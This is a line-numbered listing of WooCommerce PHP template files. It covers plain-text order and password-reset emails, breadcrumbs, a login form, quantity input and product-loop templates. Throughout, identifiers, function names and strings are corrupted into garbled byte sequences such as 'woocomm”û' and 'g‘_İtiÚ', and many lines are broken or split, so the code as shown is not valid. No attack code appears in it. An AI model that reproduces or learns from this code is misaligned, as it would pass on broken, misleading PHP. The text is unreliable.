Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

46 
echo
 
__
( 'Your details', 'woocommerce' ) . "\n\n";

48 iàĞ
	g$Üd”
->
	gblšg_ema
 )

49 
echo
 
__
Ğ'Ema:', 'woocomm”û' );ƒchØ
	g$Üd”
->
	gblšg_ema
 . "\n";

51 iàĞ
	g$Üd”
->
	gblšg_phÚe
 )

52 
echo
 
__
Ğ'T–:', 'woocomm”û' ); ?> <?
php
ƒchØ
	g$Üd”
->
	gblšg_phÚe
 . "\n";

54 
wc_g‘_‹m¶©e
Ğ'emas/¶aš/ema-add»s£s.php', 
¬¿y
Ğ'Üd”' => 
$Üd”
 ) );

56 
	gecho
 "\n****************************************************\n\n";

58 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_ema_foÙ”_‹xt', 
g‘_İtiÚ
( 'woocommerce_email_footer_text' ) );

	@templates/emails/plain/customer-processing-order.php

1 <?
php


9 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

11 
echo
 
	g$ema_h—dšg
 . "\n\n";

13 
echo
 
__
( "Your order has been„eceived‡nd is‚ow being…rocessed. Your order details‡re shown below for your„eference:", 'woocommerce' ) . "\n\n";

15 
	gecho
 "****************************************************\n\n";

17 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

19 
echo
 
¥rštf
Ğ
__
Ğ'Ord”‚umb”: %s', 'woocomm”û'), 
$Üd”
->
g‘_Üd”_numb”
() ) . "\n";

20 
echo
 
¥rštf
Ğ
__
Ğ'Ord” d©e: %s', 'woocomm”û'), 
d©e_i18n
Ğ
wc_d©e_fÜm©
(), 
¡¹Ùime
Ğ
$Üd”
->
Üd”_d©e
 ) ) ) . "\n";

22 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

24 
	gecho
 "\n" . 
	g$Üd”
->
ema_Üd”_™ems_bË
Ğ
$Üd”
->
is_dowÆßd_³rm™‹d
(), 
Œue
, ($Üd”->
¡©us
=='´oûssšg'è?ru: 
çl£
, '', '',rue );

26 
	gecho
 "----------\n\n";

28 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

29 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

30 
echo
 
$tÙ®
['label'] . "\t " . $total['value'] . "\n";

32 
	}
}

34 
	gecho
 "\n****************************************************\n\n";

36 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 );

38 
echo
 
__
( 'Your details', 'woocommerce' ) . "\n\n";

40 iàĞ
	g$Üd”
->
	gblšg_ema
 )

41 
echo
 
__
Ğ'Ema:', 'woocomm”û' );ƒchØ
	g$Üd”
->
	gblšg_ema
 . "\n";

43 iàĞ
	g$Üd”
->
	gblšg_phÚe
 )

44 
echo
 
__
Ğ'T–:', 'woocomm”û' ); ?> <?
php
ƒchØ
	g$Üd”
->
	gblšg_phÚe
 . "\n";

46 
wc_g‘_‹m¶©e
Ğ'emas/¶aš/ema-add»s£s.php', 
¬¿y
Ğ'Üd”' => 
$Üd”
 ) );

48 
	gecho
 "\n****************************************************\n\n";

50 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_ema_foÙ”_‹xt', 
g‘_İtiÚ
( 'woocommerce_email_footer_text' ) );

	@templates/emails/plain/customer-reset-password.php

1 <?
php


9 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

11 
echo
 
	g$ema_h—dšg
 . "\n\n";

13 
echo
 
__
( 'Someone„equestedhathe…assword be„eset forhe following‡ccount:', 'woocommerce' ) . "\r\n\r\n";

14 
echo
 
ÃtwÜk_home_u¾
( '/' ) . "\r\n\r\n";

15 
echo
 
¥rštf
Ğ
__
Ğ'U£ºame: %s', 'woocomm”û' ), 
$u£r_logš
 ) . "\r\n\r\n";

16 
echo
 
__
( 'Ifhis was‡ mistake, just ignorehisƒmail‡nd‚othing will happen.', 'woocommerce' ) . "\r\n\r\n";

17 
echo
 
__
( 'To„eset your…assword, visithe following‡ddress:', 'woocommerce' ) . "\r\n\r\n";

19 
echo
 
add_qu”y_¬g
Ğ
¬¿y
Ğ'key' => 
$»£t_key
, 'logš' => 
$u£r_logš
 ), 
wc_g‘_’dpošt_u¾
Ğ'lo¡-·sswÜd', '', 
g‘_³rm®šk
Ğ
wc_g‘_·ge_id
( 'myaccount' ) ) ) ) . "\r\n";

21 
	gecho
 "\n****************************************************\n\n";

23 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_ema_foÙ”_‹xt', 
g‘_İtiÚ
( 'woocommerce_email_footer_text' ) );

	@templates/emails/plain/email-addresses.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
	gecho
 "\n" . 
__
( 'Billing‡ddress', 'woocommerce' ) . ":\n";

13 
echo
 
	g$Üd”
->
g‘_fÜm©‹d_blšg_add»ss
() . "\n\n";

15 iàĞ
g‘_İtiÚ
Ğ'woocomm”û_sh_to_blšg_add»ss_Úly' ) =ğ'no' && ( 
$shpšg
 = 
$Üd”
->
	$g‘_fÜm©‹d_shpšg_add»ss
() ) ) :

17 
echo
 
	`__
( 'Shipping‡ddress', 'woocommerce' ) . ":\n";

19 
echo
 
$shpšg
 . "\n\n";

21 
’dif
;

	@templates/emails/plain/email-order-items.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

14 
glob®
 
	g$woocomm”û
;

16 
	$fÜ—ch
 ( 
$™ems
 
as
 
$™em
 ) :

17 
$_´oduù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_´oduù', 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 ), $item );

18 
$™em_m‘a
 = 
Ãw
 
	`WC_Ord”_I‹m_M‘a
Ğ
$™em
['™em_m‘a'], 
$_´oduù
 );

21 
echo
 ",".
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_Çme', 
$™em
['name'], $item );

24 iàĞ
$show_sku
 && 
$_´oduù
->
	$g‘_sku
() ) {

25 
echo
 ' (#' . 
$_´oduù
->
	`g‘_sku
() . ')';

26 
	}
}

32 
	gecho
 "," .
	g$™em
['qty'];

38 iàĞ
	g$show_dowÆßd_lšks
 && 
	g$_´oduù
->
exi¡s
(è&& $_´oduù->
	$is_dowÆßdabË
() ) {

39 
$dowÆßd_fes
 = 
$Üd”
->
	`g‘_™em_dowÆßds
Ğ
$™em
 );

40 
$i
 = 0;

42 
	`fÜ—ch
 ( 
$dowÆßd_fes
 
as
 
$dowÆßd_id
 => 
$fe
 ) {

43 
$i
++;

45 iàĞ
	`couÁ
Ğ
$dowÆßd_fes
 ) > 1 ) {

46 
$´efix
 = 
	`¥rštf
Ğ
	`__
Ğ'DowÆßd %d', 'woocomm”û' ), 
$i
 );

47 } 
	`–£if
 ( 
$i
 == 1 ) {

48 
$´efix
 = 
	`__
( 'Download', 'woocommerce' );

51 
echo
 "\n" . 
$´efix
 . '(' . 
	`esc_html
Ğ
$fe
['Çme'] ) . '): ' . 
	`esc_u¾
( $file['download_url'] );

53 
	}
}

56 iàĞ
	g$show_purcha£_nÙe
 && 
	g$purcha£_nÙe
 = 
g‘_po¡_m‘a
Ğ
$_´oduù
->
id
, '_purcha£_nÙe', 
Œue
 ) ) {

57 
	gecho
 "\n" . 
	g$purcha£_nÙe
;

62 
	g’dfÜ—ch
;

	@templates/global/breadcrumb.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$po¡
, 
	g$wp_qu”y
;

14 
	g$´•’d
 = '';

15 
	g$³rm®šks
 = 
g‘_İtiÚ
( 'woocommerce_permalinks' );

16 
	g$shİ_·ge_id
 = 
wc_g‘_·ge_id
( 'shop' );

17 
	g$shİ_·ge
 = 
g‘_po¡
Ğ
$shİ_·ge_id
 );

20 iàĞ
	g$shİ_·ge_id
 && 
	g$shİ_·ge
 && 
¡r¡r
Ğ
$³rm®šks
['´oduù_ba£'], '/' . 
$shİ_·ge
->
po¡_Çme
 ) && 
g‘_İtiÚ
Ğ'·ge_Ú_äÚt' ) !=ğ
$shİ_·ge_id
 ) {

21 
$´•’d
 = 
$befÜe
 . '<¨h»f="' . 
g‘_³rm®šk
Ğ
$shİ_·ge
 ) . '">' . $shİ_·ge->
po¡_t™Ë
 . '</a> ' . 
$aá”
 . 
$d–im™”
;

24 iàĞĞ! 
is_home
(è&& ! 
is_äÚt_·ge
(è&& ! ( 
is_po¡_ty³_¬chive
(è&& 
g‘_İtiÚ
Ğ'·ge_Ú_äÚt' ) =ğ
wc_g‘_·ge_id
Ğ'shİ' ) ) ) || 
	$is_·ged
() ) {

26 
echo
 
$w¿p_befÜe
;

28 iàĞ! 
	`em±y
Ğ
$home
 ) ) {

29 
echo
 
$befÜe
 . '<¨şass="home" h»f="' . 
	`­¶y_f‹rs
Ğ'woocomm”û_b»adüumb_home_u¾', 
	`home_u¾
(èè. '">' . 
$home
 . '</a>' . 
$aá”
 . 
$d–im™”
;

32 iàĞ
	`is_ÿ‹gÜy
() ) {

34 
$ÿt_obj
 = 
$wp_qu”y
->
	`g‘_qu”›d_objeù
();

35 
$this_ÿ‹gÜy
 = 
	`g‘_ÿ‹gÜy
Ğ
$ÿt_obj
->
‹rm_id
 );

37 iàĞ
$this_ÿ‹gÜy
->
·»Á
 != 0 ) {

38 
$·»Á_ÿ‹gÜy
 = 
	`g‘_ÿ‹gÜy
Ğ
$this_ÿ‹gÜy
->
·»Á
 );

39 
echo
 
	`g‘_ÿ‹gÜy_·»Ás
(
$·»Á_ÿ‹gÜy
, 
TRUE
, 
$d–im™”
 );

42 
echo
 
$befÜe
 . 
	`sšgË_ÿt_t™Ë
Ğ'', 
çl£
 ) . 
$aá”
;

44 } 
	`–£if
 ( 
	`is_x
( 'product_cat' ) ) {

46 
echo
 
$´•’d
;

48 
$cu¼’t_‹rm
 = 
	`g‘_‹rm_by
Ğ'¦ug', 
	`g‘_qu”y_v¬
( 'term' ), get_query_var( 'taxonomy' ) );

50 
$ªû¡Üs
 = 
	`¬¿y_»v”£
Ğ
	`g‘_ªû¡Üs
Ğ
$cu¼’t_‹rm
->
‹rm_id
, 
	`g‘_qu”y_v¬
( 'taxonomy' ) ) );

52 
	`fÜ—ch
 ( 
$ªû¡Üs
 
as
 
$ªû¡Ü
 ) {

53 
$ªû¡Ü
 = 
	`g‘_‹rm
Ğ$ªû¡Ü, 
	`g‘_qu”y_v¬
( 'taxonomy' ) );

55 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_‹rm_lšk
Ğ
$ªû¡Ü
->
¦ug
, 
	`g‘_qu”y_v¬
Ğ'xÚomy' ) ) . '">' . 
	`esc_html
Ğ$ªû¡Ü->
Çme
 ) . '</a>' . 
$aá”
 . 
$d–im™”
;

58 
echo
 
$befÜe
 . 
	`esc_html
Ğ
$cu¼’t_‹rm
->
Çme
 ) . 
$aá”
;

60 } 
	`–£if
 ( 
	`is_x
( 'product_tag' ) ) {

62 
$qu”›d_objeù
 = 
$wp_qu”y
->
	`g‘_qu”›d_objeù
();

63 
echo
 
$´•’d
 . 
$befÜe
 . 
	`__
Ğ'Produù gged &ldquo;', 'woocomm”û' ) . 
$qu”›d_objeù
->
Çme
 . '&rdquo;' . 
$aá”
;

65 } 
	`–£if
 ( 
	`is_day
() ) {

67 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_y—r_lšk
Ğ
	`g‘_the_time
Ğ'Y' ) ) . '">' . g‘_the_timeĞ'Y' ) . '</a>' . 
$aá”
 . 
$d–im™”
;

68 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_mÚth_lšk
Ğ
	`g‘_the_time
Ğ'Y' ), g‘_the_timeĞ'm' ) ) . '">' . g‘_the_timeĞ'F' ) . '</a>' . 
$aá”
 . 
$d–im™”
;

69 
echo
 
$befÜe
 . 
	`g‘_the_time
Ğ'd' ) . 
$aá”
;

71 } 
	`–£if
 ( 
	`is_mÚth
() ) {

73 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_y—r_lšk
Ğ
	`g‘_the_time
Ğ'Y' ) ) . '">' . g‘_the_timeĞ'Y' ) . '</a>' . 
$aá”
 . 
$d–im™”
;

74 
echo
 
$befÜe
 . 
	`g‘_the_time
Ğ'F' ) . 
$aá”
;

76 } 
	`–£if
 ( 
	`is_y—r
() ) {

78 
echo
 
$befÜe
 . 
	`g‘_the_time
Ğ'Y' ) . 
$aá”
;

80 } 
	`–£if
 ( 
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) && 
	`g‘_İtiÚ
Ğ'·ge_Ú_äÚt' ) !=ğ
$shİ_·ge_id
 ) {

82 
$_Çme
 = 
	`wc_g‘_·ge_id
Ğ'shİ' ) ? 
	`g‘_the_t™Ë
( wc_get_page_id( 'shop' ) ) : '';

84 iàĞ! 
$_Çme
 ) {

85 
$´oduù_po¡_ty³
 = 
	`g‘_po¡_ty³_objeù
( 'product' );

86 
$_Çme
 = 
$´oduù_po¡_ty³
->
Ïb–s
->
sšguÏr_Çme
;

89 iàĞ
	`is_£¬ch
() ) {

91 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_po¡_ty³_¬chive_lšk
Ğ'´oduù' ) . '">' . 
$_Çme
 . '</a>' . 
$d–im™”
 . 
	`__
Ğ'S—rch„esuÉ fÜ &ldquo;', 'woocomm”û' ) . 
	`g‘_£¬ch_qu”y
(è. '&rdquo;' . 
$aá”
;

93 } 
	`–£if
 ( 
	`is_·ged
() ) {

95 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_po¡_ty³_¬chive_lšk
Ğ'´oduù' ) . '">' . 
$_Çme
 . '</a>' . 
$aá”
;

99 
echo
 
$befÜe
 . 
$_Çme
 . 
$aá”
;

103 } 
	`–£if
 ( 
	`is_sšgË
(è&& ! 
	`is_©chm’t
() ) {

105 iàĞ
	`g‘_po¡_ty³
() == 'product' ) {

107 
echo
 
$´•’d
;

109 iàĞ
$‹rms
 = 
	`wc_g‘_´oduù_‹rms
Ğ
$po¡
->
ID
, '´oduù_ÿt', 
	`¬¿y
( 'orderby' => 'parent', 'order' => 'DESC' ) ) ) {

111 
$maš_‹rm
 = 
$‹rms
[0];

113 
$ªû¡Üs
 = 
	`g‘_ªû¡Üs
Ğ
$maš_‹rm
->
‹rm_id
, 'product_cat' );

115 
$ªû¡Üs
 = 
	`¬¿y_»v”£
( $ancestors );

117 
	`fÜ—ch
 ( 
$ªû¡Üs
 
as
 
$ªû¡Ü
 ) {

118 
$ªû¡Ü
 = 
	`g‘_‹rm
( $ancestor, 'product_cat' );

120 iàĞ! 
	`is_wp_”rÜ
Ğ
$ªû¡Ü
 ) && $ancestor )

121 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_‹rm_lšk
Ğ
$ªû¡Ü
->
¦ug
, '´oduù_ÿt' ) . '">' . $ªû¡Ü->
Çme
 . '</a>' . 
$aá”
 . 
$d–im™”
;

124 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_‹rm_lšk
Ğ
$maš_‹rm
->
¦ug
, '´oduù_ÿt' ) . '">' . $maš_‹rm->
Çme
 . '</a>' . 
$aá”
 . 
$d–im™”
;

128 
echo
 
$befÜe
 . 
	`g‘_the_t™Ë
(è. 
$aá”
;

130 } 
	`–£if
 ( 
	`g‘_po¡_ty³
() != 'post' ) {

132 
$po¡_ty³
 = 
	`g‘_po¡_ty³_objeù
Ğ
	`g‘_po¡_ty³
() );

133 
$¦ug
 = 
$po¡_ty³
->
»wr™e
;

134 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_po¡_ty³_¬chive_lšk
Ğ
	`g‘_po¡_ty³
(èè. '">' . 
$po¡_ty³
->
Ïb–s
->
sšguÏr_Çme
 . '</a>' . 
$aá”
 . 
$d–im™”
;

135 
echo
 
$befÜe
 . 
	`g‘_the_t™Ë
(è. 
$aá”
;

139 
$ÿt
 = 
	`cu¼’t
Ğ
	`g‘_the_ÿ‹gÜy
() );

140 
echo
 
	`g‘_ÿ‹gÜy_·»Ás
Ğ
$ÿt
, 
Œue
, 
$d–im™”
 );

141 
echo
 
$befÜe
 . 
	`g‘_the_t™Ë
(è. 
$aá”
;

145 } 
	`–£if
 ( 
	`is_404
() ) {

147 
echo
 
$befÜe
 . 
	`__
Ğ'E¼Ü 404', 'woocomm”û' ) . 
$aá”
;

149 } 
	`–£if
 ( ! 
	`is_sšgË
(è&& ! 
	`is_·ge
(è&& 
	`g‘_po¡_ty³
() != 'post' ) {

151 
$po¡_ty³
 = 
	`g‘_po¡_ty³_objeù
Ğ
	`g‘_po¡_ty³
() );

153 iàĞ
$po¡_ty³
 )

154 
echo
 
$befÜe
 . 
$po¡_ty³
->
Ïb–s
->
sšguÏr_Çme
 . 
$aá”
;

156 } 
	`–£if
 ( 
	`is_©chm’t
() ) {

158 
$·»Á
 = 
	`g‘_po¡
Ğ
$po¡
->
po¡_·»Á
 );

159 
$ÿt
 = 
	`g‘_the_ÿ‹gÜy
Ğ
$·»Á
->
ID
 );

160 
$ÿt
 = $cat[0];

161 
echo
 
	`g‘_ÿ‹gÜy_·»Ás
Ğ
$ÿt
, 
Œue
, '' . 
$d–im™”
 );

162 
echo
 
$befÜe
 . '<¨h»f="' . 
	`g‘_³rm®šk
Ğ
$·»Á
 ) . '">' . $·»Á->
po¡_t™Ë
 . '</a>' . 
$aá”
 . 
$d–im™”
;

163 
echo
 
$befÜe
 . 
	`g‘_the_t™Ë
(è. 
$aá”
;

165 } 
	`–£if
 ( 
	`is_·ge
(è&& !
$po¡
->
po¡_·»Á
 ) {

167 
echo
 
$befÜe
 . 
	`g‘_the_t™Ë
(è. 
$aá”
;

169 } 
	`–£if
 ( 
	`is_·ge
(è&& 
$po¡
->
po¡_·»Á
 ) {

171 
$·»Á_id
 = 
$po¡
->
po¡_·»Á
;

172 
$b»adüumbs
 = 
	`¬¿y
();

174  
$·»Á_id
 ) {

175 
$·ge
 = 
	`g‘_·ge
Ğ
$·»Á_id
 );

176 
$b»adüumbs
[] = '<¨h»f="' . 
	`g‘_³rm®šk
(
$·ge
->
ID
è. '">' . 
	`g‘_the_t™Ë
( $page->ID ) . '</a>';

177 
$·»Á_id
 = 
$·ge
->
po¡_·»Á
;

180 
$b»adüumbs
 = 
	`¬¿y_»v”£
( $breadcrumbs );

182 
	`fÜ—ch
 ( 
$b»adüumbs
 
as
 
$üumb
 )

183 
echo
 
$üumb
 . '' . 
$d–im™”
;

185 
echo
 
$befÜe
 . 
	`g‘_the_t™Ë
(è. 
$aá”
;

187 } 
	`–£if
 ( 
	`is_£¬ch
() ) {

189 
echo
 
$befÜe
 . 
	`__
Ğ'S—rch„esuÉ fÜ &ldquo;', 'woocomm”û' ) . 
	`g‘_£¬ch_qu”y
(è. '&rdquo;' . 
$aá”
;

191 } 
	`–£if
 ( 
	`is_g
() ) {

193 
echo
 
$befÜe
 . 
	`__
Ğ'Po¡ gged &ldquo;', 'woocomm”û' ) . 
	`sšgË_g_t™Ë
('', 
çl£
è. '&rdquo;' . 
$aá”
;

195 } 
	`–£if
 ( 
	`is_authÜ
() ) {

197 
$u£rd©a
 = 
	`g‘_u£rd©a
(
$authÜ
);

198 
echo
 
$befÜe
 . 
	`__
Ğ'AuthÜ:', 'woocomm”û' ) . ' ' . 
$u£rd©a
->
di¥Ïy_Çme
 . 
$aá”
;

202 iàĞ
	`g‘_qu”y_v¬
( 'paged' ) )

203 
echo
 ' (' . 
	`__
Ğ'Page', 'woocomm”û' ) . ' ' . 
	`g‘_qu”y_v¬
( 'paged' ) . ')';

205 
echo
 
$w¿p_aá”
;

207 
	}
}

	@templates/global/form-login.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 iàĞ
	$is_u£r_logged_š
() )

15 <
fÜm
 
m‘hod
="po¡" 
şass
="logš" <?
php
 iàĞ
$hidd’
 ) 
echo
 'style="display:none;"'; ?>>

17 <?
php
 
	`do_aùiÚ
( 'woocommerce_login_form_start' ); ?>

19 <?
php
 iàĞ
$mes§ge
 ) 
echo
 
	`w·utİ
Ğ
	`w±exturize
( $message ) ); ?>

21 <
p
 
şass
="form-row form-row-first">

22 <
Ïb–
 ="u£ºame"><?
php
 
	`_e
Ğ'U£ºamÜƒma', 'woocomm”û' ); ?> <
¥ª
 
şass
="required">*</span></label>

23 <
šput
 
ty³
="‹xt" 
şass
="šput-‹xt" 
Çme
="u£ºame" 
id
="username" />

24 </
p
>

25 <
p
 
şass
="form-row form-row-last">

26 <
Ïb–
 ="·sswÜd"><?
php
 
	`_e
Ğ'PasswÜd', 'woocomm”û' ); ?> <
¥ª
 
şass
="required">*</span></label>

27 <
šput
 
şass
="šput-‹xt" 
ty³
="·sswÜd" 
Çme
="·sswÜd" 
id
="password" />

28 </
p
>

29 <
div
 
şass
="clear"></div>

31 <?
php
 
	`do_aùiÚ
( 'woocommerce_login_form' ); ?>

33 <
p
 
şass
="form-row">

34 <?
php
 
	`wp_nÚû_f›ld
( 'woocommerce-login' ); ?>

35 <
šput
 
ty³
="subm™" 
şass
="bu‰Ú" 
Çme
="logš" 
v®ue
="<?php _e( 'Login', 'woocommerce' ); ?>" />

36 <
šput
 
ty³
="hidd’" 
Çme
="»dœeù" 
v®ue
="<?phpƒchoƒsc_url( $redirect ) ?>" />

37 <
Ïb–
 ="»memb”me" 
şass
="inline">

38 <
šput
 
Çme
="»memb”me" 
ty³
="checkbox" 
id
="»memb”me" 
v®ue
="fÜev”" /> <?
php
 
	`_e
( 'Remember me', 'woocommerce' ); ?>

39 </
Ïb–
>

40 </
p
>

41 <
p
 
şass
="lost_password">

42 <
a
 
h»f
="<?ph°echØesc_u¾Ğwc_lo¡·sswÜd_u¾(è); ?>"><?
php
 
	`_e
( 'Lost your…assword?', 'woocommerce' ); ?></a>

43 </
p
>

45 <
div
 
şass
="clear"></div>

47 <?
php
 
	`do_aùiÚ
( 'woocommerce_login_form_end' ); ?>

49 </
fÜm
>

	@templates/global/quantity-input.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <
div
 
	gşass
="quªt™y"><
šput
 
ty³
="numb”" 
¡•
="<?ph°echØesc_©ŒĞ$¡• ); ?>" <?
php
 iàĞ
	$is_num”ic
Ğ
$mš_v®ue
 ) ) : ?>
mš
="<?ph°echØesc_©ŒĞ$mš_v®u); ?>"<?
php
 
’dif
; ?> <?ph°iàĞ
	$is_num”ic
Ğ
$max_v®ue
 ) ) : ?>
max
="<?ph°echØesc_©ŒĞ$max_v®u); ?>"<?
php
 
’dif
; ?> 
Çme
="<?ph°echØesc_©ŒĞ$šput_Çm); ?>" 
v®ue
="<?ph°echØesc_©ŒĞ$šput_v®u); ?>" 
t™Ë
="<?ph°_exĞ'Qty', 'Produù quªt™y iÅuˆtoŞt', 'woocomm”û' ) ?>" 
şass
="šput-‹xˆqtyext" 
size
="4" /></
div
>

	@templates/global/sidebar.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
g‘_sideb¬
( 'shop' ); ?>

	@templates/global/wrapper-end.php

1 <?
php


11 
	g$‹m¶©e
 = 
g‘_İtiÚ
( 'template' );

13  
$‹m¶©e
 ) {

15 
echo
 '</div></div>';

18 
echo
 '</div></div>';

21 
echo
 '</div></div>';

24 
echo
 '</div></div></div>';

25 
	`g‘_sideb¬
( 'content' );

28 
echo
 '</div></div>';

30 
	}
}

	@templates/global/wrapper-start.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
	g$‹m¶©e
 = 
g‘_İtiÚ
( 'template' );

14  
$‹m¶©e
 ) {

16 
echo
 '<div id="primary"><div id="content"„ole="main">';

19 
echo
 '<div id="primary" class="site-content"><div id="content"„ole="main">';

22 
echo
 '<div id="primary" class="site-content"><div id="content"„ole="main" class="entry-contentwentythirteen">';

25 
echo
 '<div id="primary" class="content-area"><div id="content"„ole="main" class="site-contentwentyfourteen"><div class="tfwc">';

28 
echo
 '<div id="container"><div id="content"„ole="main">';

30 
	}
}

	@templates/loop/add-to-cart.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$´oduù
;

14 
echo
 
­¶y_f‹rs
( 'woocommerce_loop_add_to_cart_link',

15 
¥rštf
( '<a href="%s"„el="nofollow" data-product_id="%s" data-product_sku="%s" class="button %s…roduct_type_%s">%s</a>',

16 
esc_u¾
Ğ
$´oduù
->
add_to_ÿ¹_u¾
() ),

17 
esc_©Œ
Ğ
$´oduù
->
id
 ),

18 
esc_©Œ
Ğ
$´oduù
->
g‘_sku
() ),

19 
$´oduù
->
is_purcha§bË
() ? 'add_to_cart_button' : '',

20 
esc_©Œ
Ğ
$´oduù
->
´oduù_ty³
 ),

21 
esc_html
Ğ
$´oduù
->
add_to_ÿ¹_‹xt
() )

23 
$´oduù
 );

	@templates/loop/loop-end.php

1 <?
	gphp


10 </
	gul
>

	@templates/loop/loop-start.php

1 <?
	gphp


10 <
ul
 
	gşass
="products">

	@templates/loop/no-products-found.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 <
p
 
	gşass
="woocomm”û-šfo"><?
php
 
_e
Ğ'NØ´oduù w”found m©chšg you¸£ËùiÚ.', 'woocomm”û' ); ?></
	gp
>

	@templates/loop/orderby.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
, 
	g$wp_qu”y
;

14 iàĞ1 =ğ
$wp_qu”y
->
found_po¡s
 || ! 
	$woocomm”û_´oduùs_wl_di¥Ïy
() )

17 <
fÜm
 
şass
="woocomm”û-Üd”šg" 
m‘hod
="get">

18 <
£Ëù
 
Çme
="Üd”by" 
şass
="orderby">

19 <?
php


20 
$ÿlog_Üd”by
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿlog_Üd”by', 
	`¬¿y
(

21 'm’u_Üd”' => 
	`__
( 'Default sorting', 'woocommerce' ),

22 'pİuÏr™y' => 
	`__
( 'Sort by…opularity', 'woocommerce' ),

23 '¿tšg' => 
	`__
( 'Sort by‡verage„ating', 'woocommerce' ),

24 'd©e' => 
	`__
( 'Sort by‚ewness', 'woocommerce' ),

25 '´iû' => 
	`__
( 'Sort by…rice:†owo high', 'woocommerce' ),

26 '´iû-desc' => 
	`__
( 'Sort by…rice: higho†ow', 'woocommerce' )

29 iàĞ
	`g‘_İtiÚ
( 'woocommerce_enable_review_rating' ) === 'no' )

30 
	`un£t
Ğ
$ÿlog_Üd”by
['rating'] );

32 
	`fÜ—ch
 ( 
$ÿlog_Üd”by
 
as
 
$id
 => 
$Çme
 )

33 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$id
 ) . '" ' . 
	`£Ëùed
Ğ
$Üd”by
, $id, 
çl£
 ) . '>' .ƒsc_©ŒĞ
$Çme
 ) . '</option>';

35 </
£Ëù
>

36 <?
php


38 
	`fÜ—ch
 ( 
$_GET
 
as
 
$key
 => 
$v®
 ) {

39 iàĞ'Üd”by' ==ğ
$key
 || 'submit' === $key )

42 iàĞ
	`is_¬¿y
Ğ
$v®
 ) ) {

43 
	`fÜ—ch
Ğ
$v®
 
as
 
$šÃrV®
 ) {

44 
echo
 '<špuˆty³="hidd’"‚ame="' . 
	`esc_©Œ
Ğ
$key
 ) . '[]" v®ue="' .ƒsc_©ŒĞ
$šÃrV®
 ) . '" />';

48 
echo
 '<špuˆty³="hidd’"‚ame="' . 
	`esc_©Œ
Ğ
$key
 ) . '" v®ue="' .ƒsc_©ŒĞ
$v®
 ) . '" />';

50 
	}
}

52 </
	gfÜm
>

	@templates/loop/pagination.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$wp_qu”y
;

14 iàĞ
	g$wp_qu”y
->
	gmax_num_·ges
 <= 1 )

17 <
Çv
 
	gşass
="woocommerce-pagination">

18 <?
php


19 
echo
 
·gš©e_lšks
Ğ
­¶y_f‹rs
Ğ'woocomm”û_·gš©iÚ_¬gs', 
¬¿y
(

20 'ba£' => 
¡r_»¶aû
Ğ999999999, '%#%', 
g‘_·g’um_lšk
( 999999999 ) ),

22 'cu¼’t' => 
max
Ğ1, 
g‘_qu”y_v¬
( 'paged' ) ),

23 'tÙ®' => 
$wp_qu”y
->
max_num_·ges
,

31 </
	gÇv
>

	@templates/loop/price.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$´oduù
;

15 <?
php
 iàĞ
	g$´iû_html
 = 
$´oduù
->
	$g‘_´iû_html
() ) : ?>

16 <
¥ª
 
şass
="´iû"><?
php
 
echo
 
$´iû_html
; ?></span>

17 <?
php
 
’dif
; ?>

	@templates/loop/rating.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$´oduù
;

14 iàĞ
g‘_İtiÚ
( 'woocommerce_enable_review_rating' ) === 'no' )

18 <?
php
 iàĞ
	g$¿tšg_html
 = 
$´oduù
->
	$g‘_¿tšg_html
() ) : ?>

19 <?
php
 
echo
 
$¿tšg_html
; ?>

20 <?
php
 
’dif
